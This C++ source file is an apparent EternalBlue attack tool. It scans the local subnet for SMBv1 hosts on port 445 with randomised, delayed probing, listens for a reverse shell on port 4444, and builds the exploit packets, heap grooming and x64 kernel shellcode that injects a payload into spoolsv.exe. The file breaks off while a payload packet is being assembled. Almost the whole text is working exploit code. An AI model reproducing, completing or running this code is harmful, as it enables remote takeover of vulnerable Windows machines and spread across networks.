#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <atomic>
#include <algorithm>
#include <iomanip>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

std::string bytes_to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex;
    for (size_t i = 0; i < len; ++i) {
        ss << "0x" << std::setw(2) << std::setfill('0') << (int)data[i];
        if (i + 1 < len) ss << ", ";
        if ((i + 1) % 12 == 0) ss << "\n";
    }
    return ss.str();
}

class NetworkRecon {
private:
    struct NetConfig {
        std::string network;
        std::string mask;
        int prefix;
        std::string localIP;
    };

    static std::atomic<int> scanned_count;
    static std::atomic<int> target_count;

public:
    static std::vector<std::string> Execute() {
        NetConfig config = AcquireNetworkConfig();
        std::vector<std::string> vulnerableHosts;

        std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix << " (Local IP: " << config.localIP << ")" << std::endl;
        scanned_count = 0;
        target_count = 0;
        vulnerableHosts = PerformScan(config);

        return vulnerableHosts;
    }

private:
    static NetConfig AcquireNetworkConfig() {
        PIP_ADAPTER_ADDRESSES adapters = nullptr;
        ULONG buf_size = 0;
        NetConfig config = {};

        DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);
        if (ret == ERROR_BUFFER_OVERFLOW) {
            adapters = (PIP_ADAPTER_ADDRESSES)malloc(buf_size);
            ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);

            if (ret == ERROR_SUCCESS) {
                for (PIP_ADAPTER_ADDRESSES adapter = adapters; adapter; adapter = adapter->Next) {
                    if (ValidateAdapter(adapter)) {
                        config = ExtractConfig(adapter);
                        break;
                    }
                }
            }
            free(adapters);
        }
        return config;
    }

    static bool ValidateAdapter(PIP_ADAPTER_ADDRESSES adapter) {
        return (adapter->OperStatus == IfOperStatusUp &&
                adapter->FirstGatewayAddress != nullptr &&
                adapter->FirstUnicastAddress != nullptr &&
                adapter->IfType != IF_TYPE_SOFTWARE_LOOPBACK);
    }

    static NetConfig ExtractConfig(PIP_ADAPTER_ADDRESSES adapter) {
        NetConfig config;
        PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress;

        if (unicast && unicast->Address.lpSockaddr->sa_family == AF_INET) {
            sockaddr_in* ipv4 = (sockaddr_in*)unicast->Address.lpSockaddr;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
            config.localIP = ip_str;

            std::string mask = CalculateMask(unicast->OnLinkPrefixLength);
            config.network = CalculateNetwork(ip_str, mask);
            config.mask = mask;
            config.prefix = unicast->OnLinkPrefixLength;
        }
        return config;
    }

    static std::vector<std::string> PerformScan(const NetConfig& config) {
        std::vector<std::string> targets = GenerateTargets(config);
        std::vector<std::string> vulnerable;

        for (const auto& target : targets) {
            if (CheckPort(target, 445)) {
                vulnerable.push_back(target);
                target_count++;
            }
            scanned_count++;
            ApplyDelay();
        }

        return vulnerable;
    }

    static std::vector<std::string> GenerateTargets(const NetConfig& config) {
        std::vector<std::string> targets;
        in_addr net_addr;
        inet_pton(AF_INET, config.network.c_str(), &net_addr);

        int total_hosts = (1 << (32 - config.prefix)) - 2;
        if (total_hosts <= 0) return targets;

        std::vector<int> host_nums;
        for (int i = 1; i < total_hosts + 1; i++) { 
            host_nums.push_back(i);
        }

        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(host_nums.begin(), host_nums.end(), g);

        for (int host_num : host_nums) {
            uint32_t host_ip = ntohl(net_addr.s_addr) + host_num;
            in_addr ip;
            ip.s_addr = htonl(host_ip);

            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);

            if (std::string(ip_str) != config.localIP) {
                targets.push_back(ip_str);
            }
        }
        return targets;
    }

    static bool CheckPort(const std::string& host, int port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &target.sin_addr);

        if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                closesocket(sock);
                std::cout << "Connect failed with error: " << WSAGetLastError() << std::endl;
                return false;
            }
        }

        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);

        timeval timeout{1, 0}; 
        int result = select(0, NULL, &writefds, NULL, &timeout);
        closesocket(sock);

        if (result > 0) {
            return VerifySMBv1Protocol(host);
        } else {
            std::cout << "Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
        }
        return false;
    }

    static bool VerifySMBv1Protocol(const std::string& host) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        int timeout_ms = 3000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        std::vector<uint8_t> packet;
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // NetBIOS length

        packet.insert(packet.end(), {
            0xFF, 'S', 'M', 'B', 0x72,
            0x00, 0x00, 0x00, 0x00,
            0x18,
            0x03, 0xC8,
            0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            0xFF, 0xFE,
            0x00, 0x00,
            0x00, 0x00
        });

        packet.push_back(0x00); // Word count

        const char* dialects[] = {
            "PC NETWORK PROGRAM 1.0",
            "LANMAN1.0",
            "Windows for Workgroups 3.1a",
            "LM1.2X002",
            "LANMAN2.1"
        };

        std::vector<uint8_t> dialect_bytes;
        for (const char* d : dialects) {
            dialect_bytes.insert(dialect_bytes.end(), d, d + strlen(d));
            dialect_bytes.push_back(0x00);
        }

        uint16_t byte_count = dialect_bytes.size();
        packet.push_back(byte_count & 0xFF);
        packet.push_back((byte_count >> 8) & 0xFF);
        packet.insert(packet.end(), dialect_bytes.begin(), dialect_bytes.end());

        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;

        if (send(sock, (char*)packet.data(), packet.size(), 0) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        unsigned char buffer[2048];
        int received = recv(sock, (char*)buffer, sizeof(buffer), 0);
        closesocket(sock);

        if (received < 10) return false;
        if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
            return false;
        }

        int dialect_index = buffer[9];

        if (dialect_index <= 5) return true;

        return false;
    }

    static void ApplyDelay() {
        std::random_device rd;
        std::uniform_int_distribution<> d(20, 200);
        Sleep(d(rd));
        if (scanned_count % 30 == 0) {
            std::uniform_int_distribution<> ld(500, 1000);
            Sleep(ld(rd));
        }
    }

    static std::string CalculateMask(ULONG prefix) {
        if (prefix > 32) return "0.0.0.0";
        uint32_t mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF;
        in_addr addr;
        addr.s_addr = htonl(mask);
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr, str, INET_ADDRSTRLEN);
        return str;
    }

    static std::string CalculateNetwork(const std::string& ip, const std::string& mask) {
        in_addr ip_addr, mask_addr, net_addr;
        inet_pton(AF_INET, ip.c_str(), &ip_addr);
        inet_pton(AF_INET, mask.c_str(), &mask_addr);
        net_addr.s_addr = ip_addr.s_addr & mask_addr.s_addr;
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &net_addr, str, INET_ADDRSTRLEN);
        return str;
    }
};

class ReverseShellHandler {
private:
    SOCKET listener;
    int port;
    
public:
    ReverseShellHandler(int listenPort = 4444) : port(listenPort), listener(INVALID_SOCKET) {}
    
    bool StartListener() {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            std::cout << "[-] WSAStartup failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listener == INVALID_SOCKET) {
            std::cout << "[-] Socket creation failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        int yes = 1;
        if (setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes)) == SOCKET_ERROR) {
            std::cout << "[-] setsockopt failed: " << WSAGetLastError() << std::endl;
        }
        
        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = INADDR_ANY;
        server.sin_port = htons(port);
        
        if (bind(listener, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cout << "[-] Bind failed: " << WSAGetLastError() << std::endl;
            closesocket(listener);
            return false;
        }
        
        std::cout << "[*] Listening on port " << port << "..." << std::endl;
        if (listen(listener, 1) == SOCKET_ERROR) {
            std::cout << "[-] Listen failed: " << WSAGetLastError() << std::endl;
            closesocket(listener);
            return false;
        }
        
        std::cout << "[+] Reverse shell handler listening on port " << port << std::endl;
        return true;
    }
    
    bool WaitForConnection() {
        if (listener == INVALID_SOCKET) {
            std::cout << "[-] Listener not initialized" << std::endl;
            return false;
        }
        
        std::cout << "[*] Waiting for reverse shell connection..." << std::endl;
        
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(listener, &readfds);
        
        timeval timeout{30, 0}; // 30 seconds timeout
        
        int result = select(0, &readfds, NULL, NULL, &timeout);
        if (result > 0) {
            SOCKET client = accept(listener, NULL, NULL);
            if (client != INVALID_SOCKET) {
                std::cout << "[+] Reverse shell connection received!" << std::endl;
                HandleShell(client);
                closesocket(client);
                return true;
            }
        } else if (result == 0) {
            std::cout << "[-] Timeout waiting for reverse shell" << std::endl;
        } else {
            std::cout << "[-] Select failed: " << WSAGetLastError() << std::endl;
        }
        
        return false;
    }
    
private:
    void HandleShell(SOCKET client) {
        std::cout << "[+] Handling reverse shell session..." << std::endl;
        
        // Simple shell handling - just receive and print data
        char buffer[1024];
        int received;
        
        // Set socket to non-blocking for this demo
        u_long mode = 1;
        ioctlsocket(client, FIONBIO, &mode);
        
        auto start = std::chrono::steady_clock::now();
        while (std::chrono::steady_clock::now() - start < std::chrono::seconds(10)) {
            received = recv(client, buffer, sizeof(buffer) - 1, 0);
            if (received > 0) {
                buffer[received] = '\0';
                std::cout << "[Shell Output] " << buffer;
            } else if (received == 0) {
                std::cout << "[+] Shell disconnected" << std::endl;
                break;
            }
            
            Sleep(100);
        }
        
        std::cout << "[+] Shell session ended" << std::endl;
    }
};

class EternalBlue {
private:
    std::string targetIP;
    std::string localIP; 

    enum class ExploitType {
        TRANS2_BUFFER,
        TRANS2_ZERO, 
        TRANS2_EXPLOIT
    };

    const std::string processName = "spoolsv.exe";

    int groomAllocations = 12;
    int groomDelta = 5;
    int maxExploitAttempts = 1;

    unsigned char smbNegotiate[88];
    unsigned char sessionSetup[140];
    unsigned char treeConnectRequest[100];
    unsigned char userID[2] = {0, 0};       
    unsigned char treeID[2] = {0, 0};  
    unsigned char payload[511];

    std::vector<SOCKET> groomSockets;

    ReverseShellHandler shellHandler;

public:
    EternalBlue() {
        InitializePackets();
    }

     ~EternalBlue() {
        Cleanup();
    }

    bool Exploit(const std::string& host) {
        Cleanup();
        if (!shellHandler.StartListener()) {
            std::cout << "[-] FAILED to start reverse shell handler!" << std::endl;
            std::cout << "[-] Check if port 4444 is already in use or firewall blocking" << std::endl;
            return false;
        }

        localIP = GetLocalIPAddress();
        localIP = "192.168.84.1"; // IP VM card
        targetIP = host;
        std::cout << "[*] Local IP: " << localIP << std::endl;
        std::cout << "[*] Target: " << host << "\n\n";
        
        for (int attempt = 0; attempt < maxExploitAttempts; ++attempt) {
            std::cout << std::endl << "[*] Attempt " << (attempt + 1) << "/" << maxExploitAttempts << std::endl;

            int grooms = groomAllocations + groomDelta * attempt;
            auto shellcode = make_kernel_user_payload();
            auto payload_hdr_pkt = MakeSMB2PayloadHeadersPacket();
            auto payload_body_pkt = MakeSMB2PayloadBodyPacket(shellcode);
                    
            SOCKET sock = Connect();
            if (sock == INVALID_SOCKET) {
                std::cout << "[-] Connection failed" << std::endl;
                continue;
            }
            
            if (!SendNegotiate(sock)) { 
                std::cout << "[-] Negotiate failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] Negotiate successful" << std::endl;
        
            if (!DoSessionSetup(sock)) { 
                std::cout << "[-] Session setup failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] Session setup successful" << std::endl;
        
            if (!SendTreeConnect(sock)) { 
                std::cout << "[-] Tree connect failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] Tree connect successful" << std::endl;
            
            if (!SendNTLargeBuffer(sock)) { 
                std::cout << "[-] NT Large Buffer failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] NT Large Buffer sent" << std::endl;

            SOCKET fhs_sock = Smb1FreeHole(true);
            if (fhs_sock == INVALID_SOCKET) { 
                std::cout << "[-] SMB1 Free Hole start failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] SMB1 Free Hole start created" << std::endl;

            if (!SMB2Grooming(grooms, payload_hdr_pkt)) { 
                std::cout << "[-] SMB2 Grooming failed" << std::endl;
                closesocket(fhs_sock); 
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] SMB2 Grooming successful, " << groomSockets.size() << " sockets created" << std::endl;

            closesocket(fhs_sock);

            if (!SMB2Grooming(6, payload_hdr_pkt)) { 
                std::cout << "[-] Additional grooming failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] Additional grooming successful" << std::endl;

            SOCKET fhf_sock = Smb1FreeHole(false);
            if (fhf_sock == INVALID_SOCKET) { 
                std::cout << "[-] SMB1 Free Hole finish failed" << std::endl;
                closesocket(sock); 
                continue; 
            }
            std::cout << "[+] SMB1 Free Hole finish created" << std::endl;

            closesocket(fhf_sock);

            auto final_exploit = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_EXPLOIT, 15);
            if (!Send(sock, final_exploit.data(), final_exploit.size())) {
                std::cout << "[-] Final exploit send failed" << std::endl;
                closesocket(sock);
                continue;
            }
            std::cout << "[+] Final exploit sent" << std::endl;

            unsigned char resp[1024];
            int len = Recv(sock, resp, sizeof(resp));
            if (len > 0) {
                uint32_t status = *(uint32_t*)(resp + 9);
                std::cout << "[*] Server response status: 0x" << std::hex << status << std::dec << std::endl;
                if (status == 0xC000000D) {
                    std::cout << "[+] Exploit successful! (STATUS_INVALID_PARAMETER expected)" << std::endl;
                } else {
                    std::cout << "[-] Unexpected status response" << std::endl;
                }
            } else {
                std::cout << "[-] No response from server after exploit" << std::endl;
            }

            for (auto& groom_sock : groomSockets) {
                if (!Send(groom_sock, payload_body_pkt.data(), 2920)) {
            }
            }

            for (auto& sock : groomSockets) {
                Send(sock, payload_body_pkt.data() + 2920, 1152);
            }

            bool gotShell = shellHandler.WaitForConnection();
        
            if (gotShell) {
                std::cout << "[+] Exploit successful! Got reverse shell." << std::endl;
                return true;
            } 
            else {
                std::cout << "[-] Exploit may have worked but no shell received" << std::endl;
                continue;
            }
        }

        return true;
    }

private:

    void Cleanup() {
        for (auto sock : groomSockets) {
            if (sock != INVALID_SOCKET) closesocket(sock);
        }
        groomSockets.clear();
    }

    bool Send(SOCKET sock, const unsigned char* data, size_t size) {
        int sent = send(sock, (char*)data, size, 0);
        if (sent != (int)size) {
            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
            return false;
        }
        return true;
    }

    int Recv(SOCKET sock, unsigned char* buffer, size_t size) {
        int received = recv(sock, (char*)buffer, size, 0);
        if (received <= 0) {
            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
        }
        return received;
    }

    std::string GetLocalIPAddress() {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return "127.0.0.1"; // Fallback to localhost
        }

        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
            WSACleanup();
            return "127.0.0.1";
        }

        struct addrinfo hints = {0}, *result = nullptr;
        hints.ai_family = AF_INET; // IPv4
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) {
            WSACleanup();
            return "127.0.0.1";
        }

        std::string ip;
        for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
            if (ptr->ai_family == AF_INET) {
                char ip_str[INET_ADDRSTRLEN];
                struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)ptr->ai_addr;
                inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
                
                if (strcmp(ip_str, "127.0.0.1") != 0) {
                    ip = ip_str;
                    break;
                }
            }
        }

        freeaddrinfo(result);
        WSACleanup();
        
        return ip.empty() ? "127.0.0.1" : ip;
    }

    uint32_t generate_process_hash() {
        std::string proc_str = processName;
        proc_str.push_back('\0');

        uint32_t hash = 0;
        for (char ch : proc_str) {
            hash = (hash >> 13) | (hash << 19);          // ROR13
            hash = (hash + static_cast<uint32_t>(static_cast<uint8_t>(ch))) & 0xFFFFFFFFu;
        }
        return hash;
    }

    std::vector<uint8_t> make_kernel_user_payload() {
        std::vector<uint8_t> sc;
        std::vector<uint8_t> ring3(payload, payload + 511);  
        size_t ring3_size = sizeof(payload);
        uint32_t proc_hash = generate_process_hash();
        uint16_t len = static_cast<uint16_t>(ring3_size);

        unsigned int ip_bytes[4];
        if (sscanf(localIP.c_str(), "%u.%u.%u.%u", &ip_bytes[0], &ip_bytes[1], &ip_bytes[2], &ip_bytes[3]) != 4) return sc;
    
        ring3[246] = static_cast<uint8_t>(ip_bytes[0]);
        ring3[247] = static_cast<uint8_t>(ip_bytes[1]);
        ring3[248] = static_cast<uint8_t>(ip_bytes[2]);
        ring3[249] = static_cast<uint8_t>(ip_bytes[3]);

        unsigned char kernel_sc[] = {
            0x55, 0xe8, 0x2e, 0x00, 0x00, 0x00, 0xb9, 0x82, 0x00, 0x00, 0xc0, 0x0f, 0x32, 0x4c, 0x8d,
            0x0d, 0x34, 0x00, 0x00, 0x00, 0x44, 0x39, 0xc8, 0x74, 0x19, 0x39, 0x45, 0x00, 0x74, 0x0a,
            0x89, 0x55, 0x04, 0x89, 0x45, 0x00, 0xc6, 0x45, 0xf8, 0x00, 0x49, 0x91, 0x50, 0x5a, 0x48,
            0xc1, 0xea, 0x20, 0x0f, 0x30, 0x5d, 0xc3, 0x48, 0x8d, 0x2d, 0x00, 0x10, 0x00, 0x00, 0x48,
            0xc1, 0xed, 0x0c, 0x48, 0xc1, 0xe5, 0x0c, 0x48, 0x83, 0xed, 0x70, 0xc3, 0x0f, 0x01, 0xf8,
            0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x24, 0x25, 0xa8,
            0x01, 0x00, 0x00, 0x6a, 0x2b, 0x65, 0xff, 0x34, 0x25, 0x10, 0x00, 0x00, 0x00, 0x50, 0x50,
            0x55, 0xe8, 0xc5, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x45, 0x00, 0x48, 0x83, 0xc0, 0x1f, 0x48,
            0x89, 0x44, 0x24, 0x10, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x31,
            0xc0, 0xb2, 0x01, 0xf0, 0x0f, 0xb0, 0x55, 0xf8, 0x75, 0x14, 0xb9, 0x82, 0x00, 0x00, 0xc0,
            0x8b, 0x45, 0x00, 0x8b, 0x55, 0x04, 0x0f, 0x30, 0xfb, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0xfa,
            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0x5d, 0x58, 0xc3, 0x41, 0x57,
            0x41, 0x56, 0x57, 0x56, 0x53, 0x50, 0x4c, 0x8b, 0x7d, 0x00, 0x49, 0xc1, 0xef, 0x0c, 0x49,
            0xc1, 0xe7, 0x0c, 0x49, 0x81, 0xef, 0x00, 0x10, 0x00, 0x00, 0x66, 0x41, 0x81, 0x3f, 0x4d,
            0x5a, 0x75, 0xf1, 0x4c, 0x89, 0x7d, 0x08, 0x65, 0x4c, 0x8b, 0x34, 0x25, 0x88, 0x01, 0x00,
            0x00, 0xbf, 0x78, 0x7c, 0xf4, 0xdb, 0xe8, 0x01, 0x01, 0x00, 0x00, 0x48, 0x91, 0xbf, 0x3f,
            0x5f, 0x64, 0x77, 0xe8, 0xfc, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x03, 0x89, 0xc3, 0x3d, 0x00,
            0x04, 0x00, 0x00, 0x72, 0x03, 0x83, 0xc0, 0x10, 0x48, 0x8d, 0x50, 0x28, 0x4c, 0x8d, 0x04,
            0x11, 0x4d, 0x89, 0xc1, 0x4d, 0x8b, 0x09, 0x4d, 0x39, 0xc8, 0x0f, 0x84, 0xc6, 0x00, 0x00,
            0x00, 0x4c, 0x89, 0xc8, 0x4c, 0x29, 0xf0, 0x48, 0x3d, 0x00, 0x07, 0x00, 0x00, 0x77, 0xe6,
            0x4d, 0x29, 0xce, 0xbf, 0xe1, 0x14, 0x01, 0x17, 0xe8, 0xbb, 0x00, 0x00, 0x00, 0x8b, 0x78,
            0x03, 0x83, 0xc7, 0x08, 0x48, 0x8d, 0x34, 0x19, 0xe8, 0xf4, 0x00, 0x00, 0x00, 0x3d
        };
        
        sc.insert(sc.end(), kernel_sc, kernel_sc + sizeof(kernel_sc));
        
        
        sc.push_back((proc_hash >> 0) & 0xFF);
        sc.push_back((proc_hash >> 8) & 0xFF);
        sc.push_back((proc_hash >> 16) & 0xFF);
        sc.push_back((proc_hash >> 24) & 0xFF);
        
        sc.insert(sc.end(), {0x74, 0x10, 0x3d});
        
        sc.push_back((proc_hash >> 0) & 0xFF);
        sc.push_back((proc_hash >> 8) & 0xFF);
        sc.push_back((proc_hash >> 16) & 0xFF);
        sc.push_back((proc_hash >> 24) & 0xFF);

        unsigned char kernel_sc_part2[] = {
            0x74, 0x09, 0x48, 0x8b, 0x0c, 0x39, 0x48, 0x29, 0xf9, 0xeb, 0xe0, 0xbf, 0x48, 0xb8, 0x18,
            0xb8, 0xe8, 0x84, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x34, 0x11, 0x48,
            0x89, 0xf3, 0x48, 0x8b, 0x5b, 0x08, 0x48, 0x39, 0xde, 0x74, 0xf7, 0x4a, 0x8d, 0x14, 0x33,
            0xbf, 0x3e, 0x4c, 0xf8, 0xce, 0xe8, 0x69, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x03, 0x48, 0x83,
            0x7c, 0x02, 0xf8, 0x00, 0x74, 0xde, 0x48, 0x8d, 0x4d, 0x10, 0x4d, 0x31, 0xc0, 0x4c, 0x8d,
            0x0d, 0xa9, 0x00, 0x00, 0x00, 0x55, 0x6a, 0x01, 0x55, 0x41, 0x50, 0x48, 0x83, 0xec, 0x20,
            0xbf, 0xc4, 0x5c, 0x19, 0x6d, 0xe8, 0x35, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x10, 0x4d,
            0x31, 0xc9, 0xbf, 0x34, 0x46, 0xcc, 0xaf, 0xe8, 0x24, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4,
            0x40, 0x85, 0xc0, 0x74, 0xa3, 0x48, 0x8b, 0x45, 0x20, 0x80, 0x78, 0x1a, 0x01, 0x74, 0x09,
            0x48, 0x89, 0x00, 0x48, 0x89, 0x40, 0x08, 0xeb, 0x90, 0x58, 0x5b, 0x5e, 0x5f, 0x41, 0x5e,
            0x41, 0x5f, 0xc3, 0xe8, 0x02, 0x00, 0x00, 0x00, 0xff, 0xe0, 0x53, 0x51, 0x56, 0x41, 0x8b,
            0x47, 0x3c, 0x41, 0x8b, 0x84, 0x07, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xf8, 0x50, 0x8b,
            0x48, 0x18, 0x8b, 0x58, 0x20, 0x4c, 0x01, 0xfb, 0xff, 0xc9, 0x8b, 0x34, 0x8b, 0x4c, 0x01,
            0xfe, 0xe8, 0x1f, 0x00, 0x00, 0x00, 0x39, 0xf8, 0x75, 0xef, 0x58, 0x8b, 0x58, 0x24, 0x4c,
            0x01, 0xfb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x4c, 0x01, 0xfb, 0x8b, 0x04, 0x8b,
            0x4c, 0x01, 0xf8, 0x5e, 0x59, 0x5b, 0xc3, 0x52, 0x31, 0xc0, 0x99, 0xac, 0xc1, 0xca, 0x0d,
            0x01, 0xc2, 0x85, 0xc0, 0x75, 0xf6, 0x92, 0x5a, 0xc3, 0x55, 0x53, 0x57, 0x56, 0x41, 0x57,
            0x49, 0x8b, 0x28, 0x4c, 0x8b, 0x7d, 0x08, 0x52, 0x5e, 0x4c, 0x89, 0xcb, 0x31, 0xc0, 0x44,
            0x0f, 0x22, 0xc0, 0x48, 0x89, 0x02, 0x89, 0xc1, 0x48, 0xf7, 0xd1, 0x49, 0x89, 0xc0, 0xb0,
            0x40, 0x50, 0xc1, 0xe0, 0x06, 0x50, 0x49, 0x89, 0x01, 0x48, 0x83, 0xec, 0x20, 0xbf, 0xea,
            0x99, 0x6e, 0x57, 0xe8, 0x65, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x30, 0x85, 0xc0, 0x75,
            0x45, 0x48, 0x8b, 0x3e, 0x48, 0x8d, 0x35, 0x6a, 0x00, 0x00, 0x00
        };

        sc.insert(sc.end(), kernel_sc_part2, kernel_sc_part2 + sizeof(kernel_sc_part2));
        
        sc.push_back(0xB9);     
        sc.push_back(static_cast<uint8_t>(len & 0xFF));       
        sc.push_back(static_cast<uint8_t>((len >> 8) & 0xFF));
        sc.push_back(0x00); 
        sc.push_back(0x00); 

        unsigned char kernel_sc_final[] = {
            0xf3, 0xa4, 0x48, 0x8b, 0x45, 0xf0, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48,
            0x8b, 0x00, 0x66, 0x83, 0x78, 0x48, 0x18, 0x75, 0xf6, 0x48, 0x8b, 0x50, 0x50, 0x81, 0x7a,
            0x0c, 0x33, 0x00, 0x32, 0x00, 0x75, 0xe9, 0x4c, 0x8b, 0x78, 0x20, 0xbf, 0x5e, 0x51, 0x5e,
            0x83, 0xe8, 0x22, 0xff, 0xff, 0xff, 0x48, 0x89, 0x03, 0x31, 0xc9, 0x88, 0x4d, 0xf8, 0xb1,
            0x01, 0x44, 0x0f, 0x22, 0xc1, 0x41, 0x5f, 0x5e, 0x5f, 0x5b, 0x5d, 0xc3, 0x48, 0x92, 0x31,
            0xc9, 0x51, 0x51, 0x49, 0x89, 0xc9, 0x4c, 0x8d, 0x05, 0x0d, 0x00, 0x00, 0x00, 0x89, 0xca,
            0x48, 0x83, 0xec, 0x20, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x30, 0xc3
        };
        
        sc.insert(sc.end(), kernel_sc_final, kernel_sc_final + sizeof(kernel_sc_final));
        
        sc.insert(sc.end(), ring3.begin(), ring3.end());
        
        return sc;
    }

    std::vector<uint8_t> MakeSMB2PayloadHeadersPacket() {
        std::vector<uint8_t> pkt;
        
        // Session Message + Size
        pkt.insert(pkt.end(), {
            0x00,                           // Session Message
            0x00, 0xFF, 0xF7,               // Size
            0xFE, 'S', 'M', 'B',            // SMB2 signature
        });
        
        pkt.insert(pkt.end(), 124, 0x00);
        
        return pkt;
    }

    std::vector<uint8_t> MakeSMB2PayloadBodyPacket(const std::vector<uint8_t>& kernel_user_payload) {
        const int pkt_max_len = 4204;
        const int pkt_setup_len = 497;
        const int pkt_max_payload = pkt_max_len - pkt_setup_len;

        std::vector<uint8_t> pkt;
        
        // Padding
        pkt.insert(pkt.end(), 8, 0x00);
        pkt.insert(pkt.end(), {0x03, 0x00, 0x00, 0x00});
        pkt.insert(pkt.end(), 28, 0x00); 
        pkt.insert(pkt.end(), {0x03, 0x00, 0x00, 0x00});
        pkt.insert(pkt.end(), 116, 0x00); 

        // KI_USER_SHARED_DATA addresses (x64)
        pkt.insert(pkt.end(), {0xb0, 0x00, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff});
        pkt.insert(pkt.end(), {0xb0, 0x00, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff});
        pkt.insert(pkt.end(), 16, 0x00);
        pkt.insert(pkt.end(), {0xc0, 0xf0, 0xdf, 0xff});
        pkt.insert(pkt.end(), {0xc0, 0xf0, 0xdf, 0xff});
        pkt.insert(pkt.end(), 196, 0x00);
        
        // Payload addresses
        pkt.insert(pkt.end(), {0x90, 0xf1, 0xdf, 0xff});
